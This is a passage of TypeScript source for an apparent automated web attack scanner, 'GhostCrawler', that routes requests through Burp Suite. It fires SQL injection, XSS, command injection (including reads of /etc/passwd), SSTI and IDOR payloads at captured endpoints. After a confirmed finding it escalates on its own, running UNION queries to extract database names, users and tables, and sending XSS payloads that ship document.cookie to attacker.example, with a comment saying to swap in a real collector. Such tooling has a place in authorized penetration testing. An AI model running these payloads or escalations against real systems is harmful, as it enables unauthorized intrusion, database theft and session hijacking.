      checks.push({ name: "Extension roundtrip", status: "✓", detail: `${Date.now() - t0}ms — url=${String(r?.url || r?.result?.url || "(unknown)").slice(0, 80)}` });
    } catch (e: any) {
      checks.push({ name: "Extension roundtrip", status: "✗", detail: e?.message || "timeout" });
      if (!suggestedFix) suggestedFix = "Extension is polling but not responding to commands. Reload extension at chrome://extensions.";
    }
  } else {
    checks.push({ name: "Extension roundtrip", status: "—", detail: "skipped (extension not polling)" });
  }

  // 5. Burp MCP
  try {
    await getBurpMCPTools();
    checks.push({ name: "Burp MCP :9876", status: "✓", detail: "connected" });
  } catch (e: any) {
    checks.push({ name: "Burp MCP :9876", status: "⚠", detail: "not running (findings won't auto-log to Burp)" });
  }

  const allOk = checks.every(c => c.status === "✓" || c.status === "⚠" || c.status === "—");
  return {
    ok: allOk,
    summary: allOk ? "All systems operational." : "One or more checks failed — see suggestedFix.",
    checks,
    suggestedFix: suggestedFix || "No action needed.",
  };
}


// ══════════════════════════════════════════════════════════════════════
// Live Scan Orchestration
// ══════════════════════════════════════════════════════════════════════

async function runLiveScan(embedded = false) {
  if (!currentAttackSurface) return;

  const { scan } = currentAttackSurface;
  const endpoints = scan.endpoints || [];
  const forms = scan.forms || [];

  // Calculate total tests
  const testsPerEndpoint = 4; // SQLi, XSS, IDOR, Command Injection
  scanState.totalTests = endpoints.length * testsPerEndpoint;
  scanState.completedTests = 0;

  if (!endpoints.length) {
    if (!embedded) {
      scanState.status = "completed";
      scanState.progress = 100;
    }
    scanState.currentTest = "No API endpoints captured. Trigger app actions first, then rescan.";
    return;
  }

  console.error(`[Scan] Testing ${endpoints.length} endpoints`);

  // Test each endpoint
  for (let i = 0; i < endpoints.length; i++) {
    if (scanAbortFlag) break;

    const endpoint = endpoints[i];
    const baseUrl = scan.page.url.split("?")[0].split("#")[0];
    const testUrl = endpoint.url.startsWith("http")
      ? endpoint.url
      : new URL(endpoint.url, baseUrl).toString();

    // Test SQL Injection
    if (!scanAbortFlag) {
      scanState.currentTest = `Testing SQL injection on ${endpoint.method} ${endpoint.url}`;
      console.error(`[Scan] ${scanState.currentTest}`);
      await testSQLInjectionLive(testUrl, endpoint.method, endpoint.params);
      scanState.completedTests++;
      scanState.progress = Math.round((scanState.completedTests / scanState.totalTests) * 100);
    }

    // Test XSS
    if (!scanAbortFlag) {
      scanState.currentTest = `Testing XSS on ${endpoint.method} ${endpoint.url}`;
      console.error(`[Scan] ${scanState.currentTest}`);
      await testXSSLive(testUrl, endpoint.method, endpoint.params);
      scanState.completedTests++;
      scanState.progress = Math.round((scanState.completedTests / scanState.totalTests) * 100);
    }

    // Test IDOR
    if (!scanAbortFlag && hasIdParam(endpoint.params)) {
      scanState.currentTest = `Testing IDOR on ${endpoint.method} ${endpoint.url}`;
      console.error(`[Scan] ${scanState.currentTest}`);
      await testIDORLive(testUrl, endpoint.method, endpoint.params);
      scanState.completedTests++;
      scanState.progress = Math.round((scanState.completedTests / scanState.totalTests) * 100);
    }

    // Test Command Injection
    if (!scanAbortFlag) {
      scanState.currentTest = `Testing command injection on ${endpoint.method} ${endpoint.url}`;
      console.error(`[Scan] ${scanState.currentTest}`);
      await testCommandInjectionLive(testUrl, endpoint.method, endpoint.params);
      scanState.completedTests++;
      scanState.progress = Math.round((scanState.completedTests / scanState.totalTests) * 100);
    }

    // Test SSTI
    if (!scanAbortFlag) {
      scanState.currentTest = `Testing SSTI on ${endpoint.method} ${endpoint.url}`;
      console.error(`[Scan] ${scanState.currentTest}`);
      await testSSTILive(testUrl, endpoint.method, endpoint.params);
      scanState.completedTests++;
      scanState.progress = Math.round((scanState.completedTests / scanState.totalTests) * 100);
    }

    // Test POST body JSON injection (only for POST endpoints)
    if (!scanAbortFlag && String(endpoint.method).toUpperCase() === "POST") {
      scanState.currentTest = `Testing JSON body injection on POST ${endpoint.url}`;
      console.error(`[Scan] ${scanState.currentTest}`);
      await testPostBodyJSONLive(testUrl, endpoint.params);
      scanState.completedTests++;
      scanState.progress = Math.round((scanState.completedTests / scanState.totalTests) * 100);
    }

    // Small delay between endpoints to avoid overwhelming the target
    await new Promise((resolve) => setTimeout(resolve, 500));
  }

  if (scanAbortFlag) {
    scanState.status = "stopped";
    // Only label as "stopped by user" if user explicitly stopped it; otherwise
    // preserve the message set by the watchdog (e.g. "Aborted — extension disconnected").
    if (scanStoppedByUser) {
      scanState.currentTest = "Scan stopped by user";
    }
  } else if (!embedded) {
    scanState.status = "completed";
    scanState.currentTest = `Scan complete - ${scanState.vulnerabilities.length} vulnerabilities found`;
    scanState.progress = 100;
  }

  console.error(`[Scan] Completed - ${scanState.vulnerabilities.length} vulnerabilities found`);
}

function hasIdParam(params: any): boolean {
  if (!params) return false;
  const keys = Object.keys(params);
  return keys.some((key) => /id|user|account|profile/i.test(key));
}

function normalizeCapturedParams(params: any): Record<string, any> {
  const normalized: Record<string, any> = {};
  if (!params || typeof params !== "object") return normalized;

  for (const [rawKey, value] of Object.entries(params)) {
    const key = String(rawKey)
      .replace(/^query\./i, "")
      .replace(/^body\./i, "")
      .replace(/^param\./i, "");
    normalized[key] = value;
  }

  return normalized;
}

// ── Live browser show ────────────────────────────────────────────────────────
// Queues a URL for browser navigation — returns immediately. The _navQueue
// drainer processes at ~700ms/step so the user sees the browser move without
// the scan waiting for navigation to complete.
// Deduped: if the same URL is already the last item in the queue, it's skipped.
function liveShow(url: string): void {
  if (_navQueue[_navQueue.length - 1] !== url) {
    _navQueue.push(url);
  }
  _lastLiveShowMs = Date.now();
}

async function sendAttackRequest(
  method: string,
  url: string,
  params: Record<string, any>
): Promise<{ status: number; headers: any; body: string }> {
  const upperMethod = String(method || "GET").toUpperCase();
  const cleanParams = normalizeCapturedParams(params);

  const requestUrl =
    upperMethod === "GET"
      ? `${url}?${new URLSearchParams(cleanParams as any).toString()}`
      : url;

  const body =
    upperMethod === "POST"
      ? new URLSearchParams(cleanParams as any).toString()
      : undefined;

  // Always route through Burp proxy so every attack request appears in Burp history.
  const headers: Record<string, string> = {};
  if (upperMethod === "POST") {
    headers["Content-Type"] = "application/x-www-form-urlencoded";
  }

  // Show every attack live in the browser when in "live" mode.
  // In "silent" mode (default), attacks run quietly through Burp — faster.
  if (_attackMode === "live") {
    liveShow(requestUrl);
  }

  return sendRequestThroughBurp(upperMethod, requestUrl, headers, body);
}

async function testSQLInjectionLive(url: string, method: string, params: any) {
  const payloads = ["' OR '1'='1", "' OR 1=1--", "' UNION SELECT NULL--"];
  const baseParams = normalizeCapturedParams(params);
  
  for (const [paramName, originalValue] of Object.entries(baseParams)) {
    if (scanAbortFlag) break;
    
    for (const payload of payloads) {
      if (scanAbortFlag) break;
      
      try {
        const testParams = { ...baseParams, [paramName]: payload };
        const response = await sendAttackRequest(method, url, testParams);

        // Check for SQL error indicators
        const indicators = ["sql", "mysql", "syntax error", "sqlstate", "sqlite", "postgresql"];
        const bodyLower = response.body.toLowerCase();
        const hasIndicator = indicators.some((i) => bodyLower.includes(i));

        if (hasIndicator) {
          pushVuln({
            type: "SQL Injection",
            severity: "High",
            endpoint: `${method} ${url}`,
            param: paramName,
            payload,
            evidence: "SQL error detected in response",
          });
          console.error(`[Scan] ✗ SQL Injection found in ${paramName}`);
          // Report to Burp Repeater
          const sqliParams = { ...baseParams, [paramName]: payload };
          const sqliBody = method === "GET" ? undefined : new URLSearchParams(sqliParams).toString();
          const sqliUrl = method === "GET" ? `${url}?${new URLSearchParams(sqliParams).toString()}` : url;
          await sendFindingToBurp("High", `SQLi — ${paramName}`, method, sqliUrl, {}, sqliBody);
          // Auto-escalate: try UNION extraction
          await escalateSQLi(url, method, paramName, baseParams);
          break; // Stop testing this param if vulnerable
        }
      } catch (error: any) {
        console.error(`[Scan] Error testing SQLi:`, error.message);
      }
    }
  }
}

async function testXSSLive(url: string, method: string, params: any) {
  const payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "\"><script>alert(1)</script>",
    "'><img src=x onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "<script>alert(document.cookie)</script>",
  ];
  const baseParams = normalizeCapturedParams(params);
  
  for (const [paramName] of Object.entries(baseParams)) {
    if (scanAbortFlag) break;
    
    for (const payload of payloads) {
      if (scanAbortFlag) break;
      
      try {
        const testParams = { ...baseParams, [paramName]: payload };
        const response = await sendAttackRequest(method, url, testParams);

        // Check verbatim reflection
        const isReflected = response.body.includes(payload);
        // Check partial reflection (unencoded dangerous bits)
        const dangerous = ["onerror=", "onload=", "ontoggle=", "alert(", "<script", "javascript:"];
        const partialReflect = !isReflected && dangerous.some((d) =>
          response.body.toLowerCase().includes(d) &&
          response.body.toLowerCase().includes(paramName.toLowerCase())
        );

        if (isReflected || partialReflect) {
          pushVuln({
            type: "Cross-Site Scripting (XSS)",
            severity: "High",
            endpoint: `${method} ${url}`,
            param: paramName,
            payload,
            evidence: isReflected
              ? "Payload reflected verbatim in response body"
              : "Dangerous payload fragment reflected in response",
          });
          console.error(`[Scan] ✗ XSS found in ${paramName}`);
          // Report to Burp Repeater
          const xssParams = { ...baseParams, [paramName]: payload };
          const xssBody = method === "GET" ? undefined : new URLSearchParams(xssParams).toString();
          const xssUrl = method === "GET" ? `${url}?${new URLSearchParams(xssParams).toString()}` : url;
          await sendFindingToBurp("High", `XSS — ${paramName}`, method, xssUrl, {}, xssBody);
          // Auto-escalate: try cookie-stealing PoC
          await escalateXSS(url, method, paramName, baseParams, payload);
          break;
        }
      } catch (error: any) {
        console.error(`[Scan] Error testing XSS:`, error.message);
      }
    }
  }
}

async function testIDORLive(url: string, method: string, params: any) {
  const testValues = ["1", "2", "999"];
  const baseParams = normalizeCapturedParams(params);
  const idParam = Object.keys(baseParams).find((key) => /id|user|account/i.test(key));
  
  if (!idParam) return;
  
  const originalValue = baseParams[idParam];
  const responses: any[] = [];
  
  for (const testValue of testValues) {
    if (scanAbortFlag) break;
    
    try {
      const testParams = { ...baseParams, [idParam]: testValue };
      const response = await sendAttackRequest(method, url, testParams);

      responses.push({ value: testValue, status: response.status, length: response.body.length });
    } catch (error: any) {
      console.error(`[Scan] Error testing IDOR:`, error.message);
    }
  }
  
  // Check if different IDs return 200 with similar content (potential IDOR)
  const successfulResponses = responses.filter((r) => r.status === 200);
  if (successfulResponses.length > 1) {
    pushVuln({
      type: "Insecure Direct Object Reference (IDOR)",
      severity: "Medium",
      endpoint: `${method} ${url}`,
      param: idParam,
      payload: testValues.join(", "),
      evidence: `Multiple ID values returned 200 OK`,
    });
    console.error(`[Scan] ✗ Potential IDOR found in ${idParam}`);
  }
}

async function testCommandInjectionLive(url: string, method: string, params: any) {
  const payloads = [
    "; id",
    "| id",
    "`id`",
    "$(id)",
    "; whoami",
    "& whoami",
    "\n/bin/id",
    "%0aid",
    "; cat /etc/passwd",
    "; sleep 3",
    "| cat /etc/passwd",
    "$(cat /etc/passwd)",
  ];
  const baseParams = normalizeCapturedParams(params);
  
  for (const [paramName] of Object.entries(baseParams)) {
    if (scanAbortFlag) break;
    
    for (const payload of payloads) {
      if (scanAbortFlag) break;
      
      try {
        const testParams = { ...baseParams, [paramName]: payload };
        const response = await sendAttackRequest(method, url, testParams);

        const indicators = [
          /root:.*:0:0:/m,
          /uid=\d+\(.*?\)\s+gid=\d+/m,
          /www-data|apache|nginx|nobody/m,
          /\bwindir\b|\bsystem32\b/i,
        ];
        const hasIndicator = indicators.some((re) => re.test(response.body));

        if (hasIndicator) {
          pushVuln({
            type: "Command Injection",
            severity: "Critical",
            endpoint: `${method} ${url}`,
            param: paramName,
            payload,
            evidence: "Command execution output detected in response",
          });
          console.error(`[Scan] ✗ Command Injection found in ${paramName}`);
          break;
        }
      } catch (error: any) {
        console.error(`[Scan] Error testing command injection:`, error.message);
      }
    }
  }
}

async function testSSTILive(url: string, method: string, params: any) {
  const payloads = [
    { payload: "{{7*7}}", marker: "49" },
    { payload: "${7*7}", marker: "49" },
    { payload: "<%= 7*7 %>", marker: "49" },
    { payload: "{{7*'7'}}", marker: "7777777" },
    { payload: "#{7*7}", marker: "49" },
    { payload: "*{7*7}", marker: "49" },
  ];
  const baseParams = normalizeCapturedParams(params);

  for (const [paramName, originalValue] of Object.entries(baseParams)) {
    if (scanAbortFlag) break;

    // Baseline response to avoid false positives
    let baseline = "";
    try {
      const baseResponse = await sendAttackRequest(method, url, baseParams);
      baseline = baseResponse.body;
    } catch { /* skip baseline */ }

    for (const { payload, marker } of payloads) {
      if (scanAbortFlag) break;

      try {
        const testParams = { ...baseParams, [paramName]: payload };
        const response = await sendAttackRequest(method, url, testParams);

        if (response.body.includes(marker) && !baseline.includes(marker)) {
          pushVuln({
            type: "Server-Side Template Injection (SSTI)",
            severity: "Critical",
            endpoint: `${method} ${url}`,
            param: paramName,
            payload,
            evidence: `Template expression evaluated — ${payload} returned ${marker}`,
          });
          console.error(`[Scan] ✗ SSTI found in ${paramName} with ${payload}`);
          break;
        }
      } catch (error: any) {
        console.error(`[Scan] Error testing SSTI:`, error.message);
      }
    }
  }
}

// ══════════════════════════════════════════════════════════════════════
// Escalation — runs automatically after a vuln is confirmed
// ══════════════════════════════════════════════════════════════════════

/** After error-based SQLi confirmed, try UNION extraction to pull DB name/version/tables */
async function escalateSQLi(
  url: string,
  method: string,
  paramName: string,
  baseParams: Record<string, any>
): Promise<void> {
  // Try to find the column count (1–5) and extract database info
  const unionProbes: Array<{ cols: number; payload: string; target: string }> = [];
  for (let n = 1; n <= 5; n++) {
    const nulls = Array(n).fill("NULL").join(",");
    unionProbes.push({ cols: n, payload: `' UNION SELECT ${nulls}-- `, target: "column-count" });
  }

  let columnCount = 0;
  for (const probe of unionProbes) {
    if (scanAbortFlag) return;
    try {
      const testParams = { ...baseParams, [paramName]: probe.payload };
      const resp = await sendAttackRequest(method, url, testParams);
      const lower = resp.body.toLowerCase();
      // If no "wrong number of columns" error it likely matched
      if (resp.status === 200 && !/wrong number|different number|column.*count|have.*column/i.test(lower)) {
        columnCount = probe.cols;
        break;
      }
    } catch { /* skip */ }
  }

  if (columnCount < 1) return;

  // Build extraction payloads — try database(), version(), user() in each column slot
  const extractions = [
    { name: "database()", label: "Database name" },
    { name: "@@version", label: "DB version" },
    { name: "user()", label: "DB user" },
    { name: "(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())", label: "Table list" },
  ];

  for (const ext of extractions) {
    if (scanAbortFlag) return;
    for (let slot = 0; slot < columnCount; slot++) {
      const cols = Array(columnCount).fill("NULL");
      cols[slot] = ext.name;
      const payload = `' UNION SELECT ${cols.join(",")}-- `;
      try {
        const testParams = { ...baseParams, [paramName]: payload };
        const resp = await sendAttackRequest(method, url, testParams);
        const body = resp.body;
        // Heuristic: look for version string, username, or table names in body
        const versionMatch = body.match(/\b\d+\.\d+\.\d+[-\w]*\b/);
        const userMatch = body.match(/\b[a-z_]+@[a-z%._]+\b/i);
        const tableMatch = body.match(/\b(users|accounts|admin|members|customers|orders|products|sessions)\b/i);
        const hit = versionMatch?.[0] || userMatch?.[0] || tableMatch?.[0];
        if (hit) {
          pushVuln({
            type: "SQL Injection — Data Extraction (Escalated)",
            severity: "Critical",
            endpoint: `${method} ${url}`,
            param: paramName,
            payload,
            evidence: `${ext.label} extracted: "${hit}" — UNION SELECT confirmed with ${columnCount} column(s)`,
          });
          console.error(`[Escalate-SQLi] Extracted ${ext.label}: ${hit}`);
          return; // one confirmed extraction is enough
        }
      } catch { /* skip */ }
    }
  }
}

/** After XSS reflection confirmed, generate a cookie-stealing PoC payload and escalate severity */
async function escalateXSS(
  url: string,
  method: string,
  paramName: string,
  baseParams: Record<string, any>,
  originalPayload: string
): Promise<void> {
  const cookiePayloads = [
    `<script>document.location='https://attacker.example/steal?c='+document.cookie</script>`,
    `<img src=x onerror="fetch('https://attacker.example/steal?c='+btoa(document.cookie))">`,
    `<svg onload="new Image().src='https://attacker.example/steal?c='+encodeURIComponent(document.cookie)">`,
  ];

  for (const poc of cookiePayloads) {
    if (scanAbortFlag) return;
    try {
      const testParams = { ...baseParams, [paramName]: poc };
      const resp = await sendAttackRequest(method, url, testParams);
      const isReflected = resp.body.includes("attacker.example") || resp.body.includes("document.cookie");
      if (isReflected) {
        pushVuln({
          type: "XSS — Cookie Theft PoC (Escalated)",
          severity: "Critical",
          endpoint: `${method} ${url}`,
          param: paramName,
          payload: poc,
          evidence: `Cookie-stealing payload reflected — replace attacker.example with a real collector. Original probe: ${originalPayload}`,
        });
        console.error(`[Escalate-XSS] Cookie PoC reflected in ${paramName}`);
        return;
      }
    } catch { /* skip */ }
  }
}

/** Test a POST endpoint by injecting payloads in a JSON body (application/json) */
async function testPostBodyJSONLive(url: string, params: any) {
  if (scanAbortFlag) return;
  const baseParams = normalizeCapturedParams(params);
  if (!Object.keys(baseParams).length) return;

  const sqliPayloads = ["' OR '1'='1", "' OR 1=1--", "1' AND SLEEP(3)--"];
  const xssPayloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>"];

  const sendJSON = async (body: Record<string, any>) => {
    return sendRequestThroughBurp("POST", url, { "Content-Type": "application/json" }, JSON.stringify(body));
  };

  for (const [paramName] of Object.entries(baseParams)) {
    if (scanAbortFlag) break;

    // SQLi in JSON body
    for (const payload of sqliPayloads) {
      if (scanAbortFlag) break;
      try {
        const resp = await sendJSON({ ...baseParams, [paramName]: payload });
        const lower = resp.body.toLowerCase();
        if (/sql|mysql|syntax error|sqlstate|sqlite|postgresql/i.test(lower)) {
          pushVuln({
            type: "SQL Injection (JSON body)",
            severity: "High",
            endpoint: `POST ${url}`,
            param: paramName,
            payload,
            evidence: "SQL error in JSON POST body injection",
          });
          break;
        }
      } catch { /* skip */ }
    }

    // XSS in JSON body
    for (const payload of xssPayloads) {
      if (scanAbortFlag) break;
      try {
        const resp = await sendJSON({ ...baseParams, [paramName]: payload });
        if (resp.body.includes(payload) || /onerror=|onload=|<script/i.test(resp.body)) {
          pushVuln({
            type: "XSS (JSON body)",
            severity: "High",
            endpoint: `POST ${url}`,
            param: paramName,
            payload,
            evidence: "XSS payload reflected from JSON POST body",
          });
          break;
        }
      } catch { /* skip */ }
    }
  }
}

// ══════════════════════════════════════════════════════════════════════
// Burp Suite Proxy Integration
// ══════════════════════════════════════════════════════════════════════

const BURP_PROXY = process.env.HTTP_PROXY || "http://127.0.0.1:8080";
const ALLOW_INSECURE_TLS = process.env.GHOSTCRAWLER_INSECURE_TLS === "true";

const REQUEST_TIMEOUT_MS = 12000;

async function sendRequestThroughBurp(
  method: string,
  url: string,
  headers: Record<string, string> = {},
  body?: string
): Promise<{ status: number; headers: any; body: string }> {
  const { HttpsProxyAgent } = await import("https-proxy-agent");
  const proxyUrl = new URL(BURP_PROXY);
  const agent = new HttpsProxyAgent({
    protocol: proxyUrl.protocol,
    host: proxyUrl.hostname,
    port: proxyUrl.port,
    rejectUnauthorized: !ALLOW_INSECURE_TLS,
  } as any);

  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), REQUEST_TIMEOUT_MS);

  try {
    const response = await fetch(url, {
      method,
      headers,
      body,
      signal: controller.signal,
      // @ts-ignore
      agent,
    });
    const responseBody = await response.text();
    return {
      status: response.status,
      headers: Object.fromEntries(response.headers.entries()),
      body: responseBody,
    };
  } finally {
    clearTimeout(timer);
  }
}

// ══════════════════════════════════════════════════════════════════════
// Burp MCP Extension Client
// Routes confirmed findings → Burp Repeater tabs automatically
// ══════════════════════════════════════════════════════════════════════

const BURP_MCP_URL = process.env.BURP_MCP_URL || "http://127.0.0.1:9876";
const BRIDGE_URL = process.env.BURP_BRIDGE_URL || "http://127.0.0.1:3201";
let burpMCPToolNames: string[] = [];

// ── Burp call serialization queue ─────────────────────────────────────────
// Only ONE Burp MCP call is ever in-flight at a time. The bridge enforces
// this too, but serializing client-side avoids redundant HTTP round-trips.
let _burpQueueTail: Promise<void> = Promise.resolve();

function enqueueBurpCall<T>(fn: () => Promise<T>): Promise<T> {
  const result = _burpQueueTail.then(fn, fn);
  _burpQueueTail = result.then(() => {}, () => {});
  return result;
}

// Rate-limit Burp calls: minimum gap between successive calls.
let _lastBurpCallMs = 0;
const BURP_CALL_MIN_GAP_MS = 600;

// ── Circuit breaker ────────────────────────────────────────────────────────
let _burpConsecFails = 0;
const BURP_FAIL_THRESHOLD = 5;
let _burpCircuitOpen = false;

function resetBurpCircuit(): void {
  _burpConsecFails = 0;
  _burpCircuitOpen = false;
}

let _burpToolsDiscovered = false;
let _bridgeSpawnAttempted = false;

/**
 * Ensure the persistent burp-bridge daemon is running on BRIDGE_URL.
 * If not reachable, spawn it as a fully detached child so it survives
 * this MCP server's eventual restart — which is the whole point of the
 * bridge: Burp never sees a disconnect when this MCP server cycles.
 */
async function ensureBridgeRunning(): Promise<boolean> {
  // Probe with retries — a single failed fetch can race with a healthy bridge
  // that's momentarily busy. Without retries we'd spawn a second bridge, which
  // kills the first via EADDRINUSE → /shutdown → Burp SSE drops → Burp crashes.
  for (let attempt = 0; attempt < 3; attempt++) {
    try {
      const r = await fetch(`${BRIDGE_URL}/health`, { method: "GET" });
      if (r.ok) return true;
    } catch { /* not running yet */ }
    if (attempt < 2) await new Promise(r => setTimeout(r, 300));
  }

  if (_bridgeSpawnAttempted) return false;
  _bridgeSpawnAttempted = true;

  try {
    const { spawn } = await import("child_process");
    const path = await import("path");
    const fs = await import("fs");
    const url = await import("url");
    const here = path.dirname(url.fileURLToPath(import.meta.url));
    // Resolve bridge entry: assume sibling dir to mcp-server
    const candidates = [
      path.resolve(here, "../../burp-bridge/dist/index.js"),
      path.resolve(process.cwd(), "../burp-bridge/dist/index.js"),
      path.resolve(process.cwd(), "burp-bridge/dist/index.js"),
    ];
    let entry: string | null = null;
    for (const c of candidates) {
      try { if (fs.existsSync(c)) { entry = c; break; } } catch { /* ignore */ }
    }
    if (!entry) {
      console.error("[BurpBridge] Bridge entry not found — install/build burp-bridge first");
      return false;
    }
    const child = spawn(process.execPath, [entry], {
      detached: true,
      stdio: "ignore",
      env: { ...process.env },
    });
    child.unref();
    console.error(`[BurpBridge] Spawned bridge daemon pid=${child.pid} from ${entry}`);
    // Wait up to 5s for health to come up
    for (let i = 0; i < 25; i++) {
      await new Promise(r => setTimeout(r, 200));
      try {
        const r = await fetch(`${BRIDGE_URL}/health`);
        if (r.ok) return true;
      } catch { /* keep trying */ }
    }
    console.error("[BurpBridge] Bridge spawned but did not become healthy in 5s");
    return false;
  } catch (err: any) {
    console.error(`[BurpBridge] Could not spawn bridge: ${err?.message ?? err}`);
    return false;
  }
}

// No-op shims retained for backwards compatibility with the rest of the file.
// All Burp I/O now goes through the persistent bridge daemon.
async function getBurpClient(): Promise<any> { return null; }
function invalidateBurpClient(): void {
  _burpToolsDiscovered = false;
  // Ask the bridge to drop & reconnect its single SSE connection.
  // Fire-and-forget — the bridge handles failure gracefully.
  fetch(`${BRIDGE_URL}/reconnect`, { method: "POST" }).catch(() => {});
}

async function callBurpMCP(toolName: string, args: Record<string, unknown>): Promise<any> {
  return enqueueBurpCall(async () => {
    if (_burpCircuitOpen) {
      throw new Error("[BurpMCP] Circuit open — Burp appears to be down; skipping call");
    }

    const ok = await ensureBridgeRunning();
    if (!ok) {
      _burpConsecFails++;
      if (_burpConsecFails >= BURP_FAIL_THRESHOLD) _burpCircuitOpen = true;
      throw new Error("[BurpMCP] burp-bridge daemon unreachable on " + BRIDGE_URL);
    }

    if (!_burpToolsDiscovered) {
      try { await getBurpMCPTools(); _burpToolsDiscovered = true; } catch { /* fall through */ }
    }

    // Rate-limit
    const gap = BURP_CALL_MIN_GAP_MS - (Date.now() - _lastBurpCallMs);
    if (gap > 0) await new Promise(r => setTimeout(r, gap));

    // Remap our internal field names to Burp MCP's create_repeater_tab schema
    const mapped: Record<string, unknown> = {};
    for (const [k, v] of Object.entries(args)) {
      if (k === "request" && typeof v === "string") mapped["content"] = v;
      else if (k === "host") mapped["targetHostname"] = v;
      else if (k === "port") mapped["targetPort"] = v;
      else if (k === "useHttps") mapped["usesHttps"] = v;
      else if (k === "name") { if (!("tabName" in args)) mapped["tabName"] = v; }
      else mapped[k] = v;
    }

    for (let attempt = 0; attempt < 2; attempt++) {
      try {
        const resp = await fetch(`${BRIDGE_URL}/call`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ name: toolName, arguments: mapped }),
        });
        const body: any = await resp.json().catch(() => ({}));
        if (!resp.ok || body?.ok === false) {
          const errMsg = body?.error || `HTTP ${resp.status}`;
          throw new Error(errMsg);
        }
        _lastBurpCallMs = Date.now();
        resetBurpCircuit();
        return body.result;
      } catch (err: any) {
        const msg: string = err?.message ?? String(err);
        console.error(`[BurpMCP] bridge call attempt ${attempt + 1} failed: ${msg}`);

        if (/failed to fetch|econnrefused|econnreset|network error/i.test(msg)) {
          _burpConsecFails++;
          if (_burpConsecFails >= BURP_FAIL_THRESHOLD) {
            _burpCircuitOpen = true;
            console.error(`[BurpMCP] ⚠️  Circuit OPEN after ${_burpConsecFails} consecutive failures.`);
          }
        }
        if (/tool not found|unknown tool|no such tool/i.test(msg)) throw err;
        if (attempt === 1) throw err;
        await new Promise(r => setTimeout(r, 800));
      }
    }
  });
}

async function getBurpMCPTools(): Promise<string[]> {
  const ok = await ensureBridgeRunning();
  if (!ok) throw new Error("burp-bridge daemon unreachable on " + BRIDGE_URL);
  const resp = await fetch(`${BRIDGE_URL}/tools`);
  const body: any = await resp.json();
  if (!resp.ok || body?.ok === false) throw new Error(body?.error || `HTTP ${resp.status}`);
  const tools: any[] = body?.details ?? [];
  const names: string[] = body?.tools ?? tools.map((t: any) => t.name);
  burpMCPToolNames = names;
  const repeaterTool = tools.find((t: any) => String(t.name).toLowerCase().includes("repeater"));
  if (repeaterTool) {
    console.error(`[BurpMCP] Repeater tool: ${repeaterTool.name}  schema: ${JSON.stringify(repeaterTool.inputSchema?.properties ? Object.keys(repeaterTool.inputSchema.properties) : "unknown")}`);
  }
  return names;
}

// Build raw HTTP/1.1 request string for Burp Repeater.
// Returns `request` as a raw string; callBurpMCP will base64-encode it.
// If the browser actually sent this URL recently, real captured headers
// (cookies, auth, CSRF, etc.) and the original body are merged in so the
// Repeater tab is replayable as-is.
function buildRawRequest(method: string, url: string, headers: Record<string, string> = {}, body?: string): { host: string; port: number; useHttps: boolean; request: string } {
  const parsed = new URL(url);
  const useHttps = parsed.protocol === "https:";
  const port = parsed.port ? parseInt(parsed.port) : (useHttps ? 443 : 80);
  const path = parsed.pathname + (parsed.search || "");

  // Prefer real wire request if we captured one for this URL.
  const captured = lookupWireRequest(method, url);
  const capturedHeaders: Record<string, string> = {};
  if (captured) {
    for (const [k, v] of Object.entries(captured.headers || {})) {
      capturedHeaders[k] = v;
    }
  }

  // Caller-supplied headers win over captured (so exploit payloads can override
  // Content-Type, etc.). Captured wins over default stub.
  const mergedHeaders: Record<string, string> = {
    Host: parsed.hostname,
    "User-Agent": "GhostCrawler/1.0",
    "Accept": "*/*",
    ...capturedHeaders,
    ...headers,
  };
  // Strip pseudo-headers some browsers expose via webRequest
  for (const k of Object.keys(mergedHeaders)) {
    if (k.startsWith(":")) delete mergedHeaders[k];
  }

  // If caller didn't supply a body but we have a captured one for the same
  // method+url (typically state-changing POST replays), reuse it.
  const effectiveBody = body !== undefined
    ? body
    : (captured && captured.method.toUpperCase() === method.toUpperCase() ? captured.body : undefined);

  if (effectiveBody !== undefined && effectiveBody !== null && effectiveBody !== "") {
    mergedHeaders["Content-Type"] = headers["Content-Type"]
      || capturedHeaders["Content-Type"]
      || mergedHeaders["Content-Type"]
      || "application/x-www-form-urlencoded";
    mergedHeaders["Content-Length"] = String(Buffer.byteLength(effectiveBody));
  }
  const headerLines = Object.entries(mergedHeaders).map(([k, v]) => `${k}: ${v}`).join("\r\n");
  const rawRequest = `${method} ${path} HTTP/1.1\r\n${headerLines}\r\n\r\n${effectiveBody ?? ""}`;
  return { host: parsed.hostname, port, useHttps, request: rawRequest };
}

// Deduplicated set of endpoint keys already sent to Burp Repeater tabs
const repeaterTabsSent = new Set<string>();

// Create a Burp Repeater tab for any discovered endpoint (not just findings)
async function createEndpointRepeaterTab(method: string, url: string): Promise<void> {
  const key = `${method.toUpperCase()} ${url}`;
  if (repeaterTabsSent.has(key)) return;
  repeaterTabsSent.add(key);
  try {
    const parsed = new URL(url);
    const path = parsed.pathname + (parsed.search || "");
    const tabLabel = `${method.toUpperCase()} ${path}`;
    const { host, port, useHttps, request } = buildRawRequest(method.toUpperCase(), url, {});
    const toolName = burpMCPToolNames.find(n => n.toLowerCase().includes("repeater"))
      ?? "create_repeater_tab";
    console.error(`[BurpMCP] Creating tab "${tabLabel}" via tool="${toolName}" host=${host}:${port} https=${useHttps} rawLen=${request.length}`);
    await callBurpMCP(toolName, { host, port, useHttps, request, tabName: tabLabel });
    console.error(`[BurpMCP] Endpoint tab created: ${tabLabel}`);
  } catch (e: any) {
    console.error(`[BurpMCP] Could not create Repeater tab: ${e?.message ?? e}`);
  }
}

// Ask user how to proceed after a confirmed auth bypass; shows HUD choice prompt.
async function waitForAuthDecision(postAuthUrl: string): Promise<'run' | 'skip' | 'manual'> {
  scanState.currentTest = `[AUTH] Bypass confirmed — choose: run authenticated scan or skip?`;
  await sendExtensionCommand("hud-auth-choice", {
    postAuthUrl,
    options: [
      { label: "✅ Run Authenticated Scan", value: "run" },
      { label: "⏭️ Skip (stay unauthenticated)", value: "skip" },
      { label: "👁️ Manual (I'll explore myself)", value: "manual" },
    ]
  }, 3000).catch(() => {});

  return new Promise<'run' | 'skip' | 'manual'>((resolve) => {
    authDecisionResolve = resolve;
    setTimeout(() => {
